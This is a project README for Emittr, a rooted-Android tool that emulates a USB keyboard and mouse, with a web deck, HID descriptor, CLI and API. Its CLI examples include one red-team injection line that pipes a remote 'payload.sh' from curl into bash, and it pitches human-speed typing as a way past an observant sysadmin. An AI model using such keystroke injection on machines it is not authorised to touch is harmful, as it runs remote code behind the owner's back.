<div align="center">

```
███████╗███╗   ███╗██╗████████╗████████╗██████╗ 
██╔════╝████╗ ████║██║╚══██╔══╝╚══██╔══╝██╔══██╗
█████╗  ██╔████╔██║██║   ██║      ██║   ██████╔╝
██╔══╝  ██║╚██╔╝██║██║   ██║      ██║   ██╔══██╗
███████╗██║ ╚═╝ ██║██║   ██║      ██║   ██║  ██║
╚══════╝╚═╝     ╚═╝╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝
```

### *Tactical USB HID Deck • Ghost Keyboard • Dual Xbox Joysticks*
**Turn any rooted Android or NetHunter phone into an unapologetic hardware-grade USB keyboard, precision trackpad, and continuous scrolling deck.**

[![Release](https://img.shields.io/badge/Release-v1.3.0-00E5FF.svg?style=for-the-badge&logo=github)](https://github.com/)
[![License: MIT](https://img.shields.io/badge/License-MIT-F50057.svg?style=for-the-badge)](LICENSE)
[![Gadget](https://img.shields.io/badge/USB_Gadget-Composite_HID-7C4DFF.svg?style=for-the-badge&logo=linux)](https://docs.kernel.org/usb/gadget_configfs.html)
[![Web Deck](https://img.shields.io/badge/Deck-Material_3_PWA-00E676.svg?style=for-the-badge&logo=pwa)](http://localhost:8088)
[![PWA Ready](https://img.shields.io/badge/PWA-Mobile--First_Deck-FF9100.svg?style=for-the-badge)](#-progressive-web-app--mobile-cyberdeck-architecture)

<br/>

> *"Because typing a 64-character Wi-Fi password onto a locked-down workstation using your sweaty thumbs in 2026 is an insult to your dignity."*

<br/>

[🔥 Features](#-why-emittr-the-reality-check) • [🕹️ Xbox Joysticks](#-dual-xbox-thumbsticks--native-ac-pan-scrolling) • [⚡ Quick Start](#-quick-start-zero-to-hero-in-2-minutes) • [🛡️ Hardware Safety](#-failsafe-modifier-guard--instant-unstick) • [🛠️ Architecture](#-the-engine-room-architecture--descriptor-anatomy) • [💻 CLI (`usbtype`)](#-the-cli-arsenal-usbtype) • [🤝 Contributing](CONTRIBUTING.md)

</div>

---

## 🧐 Why Emittr? (The Reality Check)

Ever tried controlling a PC with those sketchy Wi-Fi mouse apps from the Play Store? You install a random `.exe` server on your laptop, fight Windows Firewall, deal with 200ms lag, and pray it doesn’t leak your keystrokes to a random cloud server.

Or maybe you tried a BadUSB rubber ducky, but it’s completely blind, fires once, and if your machine lags for half a second, the entire payload types into Notepad instead of PowerShell.

**Emittr does things the right way:** it uses your phone's USB-OTG port and kernel `configfs` to disguise your phone as a **genuine, physical Dell USB Keyboard & Mouse**.

| Feature | Shady Wi-Fi / Bluetooth Apps | BadUSB USB Sticks | Emittr v1.3.0 ⚡ |
|---|---|---|---|
| **Host PC Setup** | Needs client `.exe` / drivers | None (blind flash drive) | **Zero host install.** Works on BIOS, Windows, Mac, Linux, PS5. |
| **Network Dependency** | Needs shared Wi-Fi / pairing | None | **Pure physical USB cable.** Air-gapped workstations rejoice. |
| **Interactive Control** | Laggy & unreliable | ❌ Impossible (read-only script) | **Real-time typing, live touchpad, shortcuts & joysticks.** |
| **Scrolling Engine** | Clunky fake wheel ticks | ❌ None | **Dual Xbox Joysticks** with native hardware AC Pan horizontal scroll. |
| **Modifier State Safety** | ❌ Prone to stuck keys / lockup | ❌ No state recovery | **Hardware zero-flush guard + auto-reconnect flush.** |
| **USB Mode Persistence** | N/A | N/A | **Active kernel watchdog** permanently preserves HID gadget mode. |
| **UI Aesthetics** | Basic HTML / clunky | None | **Sleek, responsive dark Material Design 3 cyberdeck PWA.** |

---

## ⚡ What's in the Arsenal?

### 1. 🚀 Bulk Text Typer (The 1,000 WPM Typist)
Paste long shell scripts, base64 blobs, license keys, or multi-paragraph texts from your phone. Hit **Type** and watch your phone fire them across the USB cable faster than humanly possible.
* **Granular Speed Slider**: Set speeds from *Instant* (5ms per key) to *Human* (60ms per key) if your target machine has an overzealous input buffer or an observant sysadmin looking over your shoulder.
* **Pre-Flight Countdown**: 1 to 5 second delay giving you time to click into the right input box or terminal window before the keystroke storm begins.
* **Progress Bar & Abort Button**: Visual progress with an instant kill switch.

### 2. 📱 Live Keyboard Mirror (Brain-to-Wire)
Type using whatever virtual keyboard you love on your phone — **SwiftKey, Gboard, Samsung Keyboard, or Voice-to-Text**.
* Keystrokes are diffed and streamed over a sub-5ms WebSocket connection straight into the USB HID pipe.
* Dedicated **Hardware Helper Buttons** for keys mobile keyboards never give you: <kbd>Tab ⇥</kbd>, <kbd>Esc</kbd>, <kbd>Backspace ⌫</kbd>, and a 4-way physical arrow pad (<kbd>▲</kbd> <kbd>◀</kbd> <kbd>▼</kbd> <kbd>▶</kbd>) to navigate BIOS menus, grub bootloaders, and terminal CLI menus.
* **Collapsible Strokes Feed**: A sleek telemetry feed showing keystroke history that tucks neatly out of sight when you want zero distractions.

### 3. 🖱️ Precision Trackpad & Gestures
Turn your phone's glass into a high-precision, low-latency laptop touchpad.
* **Fluid Glide**: Sub-millisecond cursor tracking calibrated to your phone's touch digitizer.
* **Two-Finger Multi-Touch Scrolling**: Slide two fingers up/down for vertical scroll, or left/right for smooth horizontal panning.
* **Tap-to-Click**: Intuitive sub-220ms gesture recognition for instantaneous left click.
* **Tactile Mouse Buttons**: Dedicated <kbd>Left</kbd>, <kbd>Middle</kbd>, and <kbd>Right</kbd> click pads with distinct haptic feedback.
* **Sensitivity Slider**: Dial your cursor speed anywhere from `0.5×` (sniper mode) to `2.0×` (dual-4K monitor zoom).

### 4. 🕹️ Dual Xbox Thumbsticks & Native AC Pan Scrolling
*Because scrolling through 10,000 rows in Excel or massive codebases on a touchscreen shouldn't feel like dragging an anchor.*

Emittr embeds two authentic **Xbox-style thumbstick caps** side-by-side:
* **Left Stick (Vertical Scroll)**: Deflect Up to scroll up, deflect Down to scroll down.
* **Right Stick (Horizontal Scroll)**: Deflect Left to scroll left, deflect Right to scroll right.
* **Continuous Rate Physics**: The harder you push the stick, the faster the stream of scroll ticks. Release your thumb, and it snaps back to center with crisp CSS springs, instantly halting the scroll.
* **True Hardware AC Pan (Usage 0x0238)**: Emittr transmits native USB HID AC Pan mouse reports. Operating systems like Windows natively dispatch standard `WM_MOUSEHWHEEL` events directly into VS Code, Chrome, Excel, and terminal emulators without synthetic keyboard shortcuts.

```
       Vertical Scroll                      Horizontal Scroll
       ┌─────────────┐                       ┌─────────────┐
       │     ▲       │                       │             │
       │  ┌───────┐  │                       │  ┌───────┐  │
       │  │ ( · ) │  │                       │◀ │ ( · ) │ ▶│
       │  └───────┘  │                       │  └───────┘  │
       │     ▼       │                       │             │
       └─────────────┘                       └─────────────┘
      Push Up / Down                         Push Left / Right
    Rate-Based Continuous                 Native AC Pan (0x0238)
```

### 5. 🎛️ Universal Dashboard Mode
Whether you’re on a 5.5-inch phone in portrait mode or an ultrawide desktop monitor, Dashboard Mode morphs to give you full control:
* **On Mobile (`< 900px`)**: Unrolls all four decks (Typer, Touchpad, Shortcuts, Live Keys) into a unified, all-in-one scrollable deck. Tapping any tab in the bottom bar smoothly glides directly to that card.
* **On Desktop (`≥ 900px`)**: Expands into a dual-column battle station. Typer and Windows Shortcuts on the left; Touchpad with Xbox Joysticks and Live Keys on the right.

### 6. 🛡️ Failsafe Modifier Guard & Instant Unstick
Hardware-level protection ensuring target host modifier states (<kbd>Ctrl</kbd>, <kbd>Alt</kbd>, <kbd>Shift</kbd>, <kbd>GUI</kbd>) stay synchronized under all field conditions:
* **One-Tap Hardware Flush**: A dedicated **"Unstick"** header button immediately transmits all-zero HID release reports across both keyboard and mouse endpoints.
* **Autonomous UDC Reconnect Guard**: The background controller continuously monitors the physical USB Device Controller (UDC) state, automatically injecting clean release packets the millisecond the cable is connected.

---

## 🚀 Quick Start: Zero to Hero in 2 Minutes

### Prerequisites
* A rooted Android phone (Kali NetHunter, Magisk, or any Linux chroot).
* Kernel built with USB Gadget ConfigFS support (`CONFIG_USB_CONFIGFS=y`, `CONFIG_USB_CONFIGFS_F_HID=y`). *Almost all modern Android kernels (3.18, 4.4, 4.9, 4.14, 4.19, 5.x) have this built-in.*
* A standard USB OTG cable or USB-C to USB-A data cable.

### 1. Clone & Deploy
```bash
git clone https://github.com/mranj/usb-typer.git
cd usb-typer
```

### 2. Run the Autonomous Installer
From your NetHunter or rooted Android terminal as `root`:
```bash
bash install.sh
```

**What the installer does automatically:**
1. Installs all daemon and web assets to `/opt/usb_hid_deck/`.
2. Symlinks the `usbtype` binary to `/usr/local/bin/usbtype`.
3. Neuters Android's `sys.usb.config` mass-storage auto-reset triggers.
4. Builds `/config/usb_gadget/g1` with our composite Report ID 1 (Keyboard) and Report ID 2 (AC Pan Mouse) descriptor.
5. Spawns the FastAPI server daemon on port `8088`.
6. Sets up the port 80 loopback redirector so `http://hid.keyboard` works instantly.

### 3. Make It Immortal Across Reboots (Magisk)
Keep Emittr alive even after rebooting your phone by copying the boot script:
```bash
cp /opt/usb_hid_deck/02-usb-deck.sh /data/adb/service.d/02-usb-deck.sh
chmod +x /data/adb/service.d/02-usb-deck.sh
```

### 4. Plug In and Play!
Plug the USB cable between your phone and the target computer.
* **On your phone's browser**: Open `http://localhost:8088` or `http://hid.keyboard`.
* **From your laptop/tablet on Wi-Fi**: Open `http://<phone-ip>:8088`.
* **Tip**: In Chrome on Android, tap `⋮` -> **"Add to Home Screen"** to run Emittr as an edge-to-edge, full-screen native PWA!

---

## 📱 Progressive Web App & Mobile Cyberdeck Architecture

Emittr delivers a native, app-like field terminal engineered for fluid touch interaction and instantaneous loading across any mobile or desktop screen:

* **Instantaneous First-Frame Render**: Critical layout geometry, responsive header controls, touch surfaces, and the dual joysticks load synchronously in the DOM for immediate, rock-solid visual readiness.
* **Progressive Web App (PWA) Ready**: Fully installable to Android home screens with standalone manifest support, giving you an edge-to-edge, immersive tactile deck free from browser chrome.
* **Adaptive Screen Hierarchy**: Dynamically reflows on mobile devices ($\le 520\text{px}$) into streamlined pill controls and single-thumb ergonomics, while automatically spreading into a comprehensive dual-column command center on tablets and desktop monitors.
* **High-Throughput Reactive Engine**: High-speed FastAPI backend paired with sub-millisecond WebSocket streaming guarantees near-zero latency from touch digitizer to physical USB output.

---

## 🔬 The Engine Room: Architecture & Descriptor Anatomy

```
┌──────────────────────────────────────────────────────────────┐
│                 Mobile Browser / PWA Client                  │
│    (Material Design 3 • Mobile-First PWA • Dual Joysticks)    │
└──────────────────────────────┬───────────────────────────────┘
                               │ WebSocket (/ws) & REST (/api)
                               ▼
┌──────────────────────────────────────────────────────────────┐
│               FastAPI Non-Blocking Controller                │
│             (Active Watchdog • Auto-Flush Guard)             │
└──────────────┬───────────────────────────────┬───────────────┘
               │ Report ID 1 (9 Bytes)         │ Report ID 2 (6 Bytes)
               ▼                               ▼
┌──────────────────────────────────────────────────────────────┐
│              /dev/hidg0 (Composite HID Gadget)               │
│                                                              │
│  [Report ID 1: Keyboard]                                     │
│  Byte 0 : Report ID (0x01)                                   │
│  Byte 1 : Modifiers (Ctrl, Shift, Alt, Win - 8 bits)         │
│  Byte 2 : Reserved (0x00)                                    │
│  Bytes 3-8 : Keycodes (6-Key Rollover array)                 │
│                                                              │
│  [Report ID 2: Mouse with AC Pan]                            │
│  Byte 0 : Report ID (0x02)                                   │
│  Byte 1 : Buttons (Bit 0: Left, Bit 1: Right, Bit 2: Middle)  │
│  Byte 2 : Relative X movement (-127 to +127)                 │
│  Byte 3 : Relative Y movement (-127 to +127)                 │
│  Byte 4 : Vertical Wheel (-127 to +127)                      │
│  Byte 5 : Horizontal AC Pan Wheel (-127 to +127)             │
└──────────────────────────────┬───────────────────────────────┘
                               │ Physical USB OTG Cable
                               ▼
┌──────────────────────────────────────────────────────────────┐
│           Target Workstation (Win / Mac / Linux / PS5)        │
│       Plug & Play Recognized as Standard Keyboard & Mouse    │
└──────────────────────────────────────────────────────────────┘
```

<details>
<summary><b>🔍 Click to view the Raw HID Report Descriptor (Report ID 1 & 2)</b></summary>

```c
// Composite Keyboard (ID 1) + Mouse with AC Pan (ID 2)
0x05, 0x01,        // Usage Page (Generic Desktop Ctrls)
0x09, 0x06,        // Usage (Keyboard)
0xA1, 0x01,        // Collection (Application)
0x85, 0x01,        //   Report ID (1) - Keyboard
0x05, 0x07,        //   Usage Page (Kbrd/Keypad)
0x19, 0xE0,        //   Usage Minimum (0xE0 - LeftControl)
0x29, 0xE7,        //   Usage Maximum (0xE7 - Right GUI)
0x15, 0x00,        //   Logical Minimum (0)
0x25, 0x01,        //   Logical Maximum (1)
0x75, 0x01,        //   Report Size (1)
0x95, 0x08,        //   Report Count (8)
0x81, 0x02,        //   Input (Data,Var,Abs,NoWrap,Linear,PreferredState,NoNullPosition)
0x95, 0x01,        //   Report Count (1)
0x75, 0x08,        //   Report Size (8)
0x81, 0x03,        //   Input (Const,Var,Abs,NoWrap,Linear,PreferredState,NoNullPosition)
0x95, 0x06,        //   Report Count (6)
0x75, 0x08,        //   Report Size (8)
0x15, 0x00,        //   Logical Minimum (0)
0x25, 0x65,        //   Logical Maximum (101)
0x05, 0x07,        //   Usage Page (Kbrd/Keypad)
0x19, 0x00,        //   Usage Minimum (0x00)
0x29, 0x65,        //   Usage Maximum (0x65)
0x81, 0x00,        //   Input (Data,Array,Abs,NoWrap,Linear,PreferredState,NoNullPosition)
0xC0,              // End Collection

0x05, 0x01,        // Usage Page (Generic Desktop Ctrls)
0x09, 0x02,        // Usage (Mouse)
0xA1, 0x01,        // Collection (Application)
0x85, 0x02,        //   Report ID (2) - Mouse
0x09, 0x01,        //   Usage (Pointer)
0xA1, 0x00,        //   Collection (Physical)
0x05, 0x09,        //     Usage Page (Button)
0x19, 0x01,        //     Usage Minimum (0x01 - Button 1)
0x29, 0x05,        //     Usage Maximum (0x05 - Button 5)
0x15, 0x00,        //     Logical Minimum (0)
0x25, 0x01,        //     Logical Maximum (1)
0x75, 0x01,        //     Report Size (1)
0x95, 0x05,        //     Report Count (5)
0x81, 0x02,        //     Input (Data,Var,Abs)
0x75, 0x03,        //     Report Size (3)
0x95, 0x01,        //     Report Count (1)
0x81, 0x03,        //     Input (Const,Var,Abs)
0x05, 0x01,        //     Usage Page (Generic Desktop Ctrls)
0x09, 0x30,        //     Usage (X)
0x09, 0x31,        //     Usage (Y)
0x09, 0x38,        //     Usage (Wheel)
0x15, 0x81,        //     Logical Minimum (-127)
0x25, 0x7F,        //     Logical Maximum (127)
0x75, 0x08,        //     Report Size (8)
0x95, 0x03,        //     Report Count (3)
0x81, 0x06,        //     Input (Data,Var,Rel)
0x05, 0x0C,        //     Usage Page (Consumer Devices)
0x0A, 0x38, 0x02,  //     Usage (AC Pan - Horizontal Scroll)
0x15, 0x81,        //     Logical Minimum (-127)
0x25, 0x7F,        //     Logical Maximum (127)
0x75, 0x08,        //     Report Size (8)
0x95, 0x01,        //     Report Count (1)
0x81, 0x06,        //     Input (Data,Var,Rel)
0xC0,              //   End Collection
0xC0               // End Collection
```
</details>

---

## 💻 The CLI Arsenal: `usbtype`

Scripting a red-team injection or automated testing rig? Emittr ships with a standalone, blazing-fast command line interface:

```bash
# Check current gadget state and health
usbtype --status

# Fire a raw command onto the host machine
usbtype "curl -sL https://example.com/payload.sh | bash"

# Slow down typing speed (45ms per keystroke) for vintage terminals
usbtype --delay 45 "dmesg | grep -i usb"

# Inject hotkeys and system shortcuts
usbtype --key win+r
usbtype --key ctrl+alt+t
usbtype --key ctrl+shift+esc

# Release any stuck modifiers across the board
usbtype --release
```

### Pro-Tip: The "Tactical Rickroll"
```bash
usbtype --key win+r
sleep 0.5
usbtype "https://youtu.be/dQw4w9WgXcQ"
usbtype --key enter
```

---

## 🔌 REST & WebSocket API Reference

Need to control Emittr from Python, Node.js, Bash, or Home Assistant? The entire engine is exposed over HTTP and WebSocket on port `8088`.

### HTTP Endpoints

| Method | Endpoint | Description | Example Payload |
|---|---|---|---|
| `GET` | `/api/status` | Current USB connection, UDC name, and version | *None* |
| `POST` | `/api/release` | Emergency panic release (null flushes all keys/buttons) | `{}` |
| `POST` | `/api/type` | Types a string with custom delays | `{"text": "ls -la", "delay_ms": 15, "initial_delay_s": 0}` |
| `POST` | `/api/stop` | Halts any active bulk typing job immediately | `{}` |
| `POST` | `/api/key` | Injects a modifier combo or named key | `{"combo": "win+r"}` or `{"key": "enter"}` |
| `POST` | `/api/mouse` | Injects mouse movement, buttons, or scroll | `{"dx": 10, "dy": -5, "wheel": 2, "wheel_h": 0}` |

### WebSocket (`ws://<phone-ip>:8088/ws`)
For sub-5ms interactive control, connect to `/ws`:
```json
// Live keystroke injection
{ "action": "live_char", "char": "x" }

// Continuous mouse movement
{ "action": "mouse_move", "dx": 8, "dy": -3 }

// Click (1=Left, 2=Right, 4=Middle)
{ "action": "mouse_click", "button": 1 }

// Dual-axis scroll (wheel_v = vertical, wheel_h = AC Pan horizontal)
{ "action": "mouse_scroll", "wheel_v": 3, "wheel_h": -2 }

// Emergency release
{ "action": "release_all" }
```

---

## 💡 Frequently Asked Questions & Capabilities

<details>
<summary><b>❓ Does Emittr require any software, drivers, or agents installed on the host PC?</b></summary>

**No.** Emittr functions as a genuine, hardware-level USB Human Interface Device (HID). When connected via USB OTG, host operating systems (Windows, macOS, Linux, ChromeOS, BSD, Android, gaming consoles, or motherboard BIOS/UEFI) detect the device as a standard physical keyboard and mouse. No external drivers, agent software, or network pairing are required.
</details>

<details>
<summary><b>❓ How does native horizontal AC Pan scrolling work across target platforms?</b></summary>

Emittr implements the official USB-IF Consumer Usage `0x0238` (**AC Pan**) directly inside the composite mouse report descriptor (Report ID 2). Unlike tools that simulate horizontal scrolling via synthetic `Shift + Wheel` keyboard combos, Emittr transmits true hardware pan events. Operating systems like Windows translate these natively into `WM_MOUSEHWHEEL` events, providing smooth horizontal navigation in VS Code, Excel, Chrome, Sublime Text, IDEs, and terminals without extra software.
</details>

<details>
<summary><b>❓ How does Emittr maintain persistent USB HID gadget connectivity on Android?</b></summary>

Android's native `UsbDeviceManager` routinely monitors OTG status and may revert USB gadget configurations when cables are disconnected. Emittr features an integrated background watchdog daemon that maintains gadget locks on `/dev/hidg0` and automatically preserves composite keyboard and mouse endpoints across reconnects without requiring device reboots.
</details>

<details>
<summary><b>❓ How does the modifier failsafe prevent stuck keys?</b></summary>

If a physical cable is disconnected mid-payload, target operating systems can retain the last active modifier state (such as <kbd>Ctrl</kbd> or <kbd>Shift</kbd>). Emittr addresses this through two automated layers:
1. **Autonomous UDC Reconnect Flush**: Upon detecting a physical cable connection, the daemon instantly injects clean zero-byte release reports before user interaction begins.
2. **One-Tap Unstick Button**: The prominent "Unstick" control in the web deck immediately clears all modifier and button states on demand.
</details>

<details>
<summary><b>❓ Can Emittr be run as a standalone fullscreen app on mobile?</b></summary>

**Yes!** Emittr is built as a complete Progressive Web App (PWA). In mobile browsers such as Chrome or Brave on Android, open `http://localhost:8088`, tap the menu (`⋮`), and select **"Add to Home Screen"**. This launches Emittr as an edge-to-edge, standalone hardware control deck with zero browser navigation bars.
</details>

---

## 🤝 Contributing & Community

Emittr is an open-source project and thrives on community feedback, device testing, and pull requests!

* 🐛 **Found a bug?** File a detailed report using the [Bug Report Form](https://github.com/mr-anjaneyam/Emittr/issues/new?template=bug_report.yml).
* 💡 **Have a feature idea?** Suggest enhancements using the [Feature Request Form](https://github.com/mr-anjaneyam/Emittr/issues/new?template=feature_request.yml).
* 📱 **Tested a phone or kernel?** Help build our hardware database via the [Hardware Compatibility Form](https://github.com/mr-anjaneyam/Emittr/issues/new?template=hardware_compatibility.yml).
* 🛠️ **Want to submit code?** Read our [`CONTRIBUTING.md`](CONTRIBUTING.md) guide and [`CODE_OF_CONDUCT.md`](CODE_OF_CONDUCT.md).
* 💬 **Questions & Discussions:** Join fellow builders in [GitHub Discussions](https://github.com/mr-anjaneyam/Emittr/discussions).
* 🔒 **Security:** Review [`SECURITY.md`](SECURITY.md) for responsible vulnerability disclosure.

---

## 📜 License & Credits

Distributed under the **MIT License**. See [`LICENSE`](LICENSE) for complete terms.

Designed & built for hackers, sysadmins, and anyone who believes typing passwords manually onto headless servers is a relic of the past.

<div align="center">
  <sub>Built with ⚡ by <a href="https://github.com/mranj">mranj</a> & pair-programmed with Antigravity</sub>
</div>
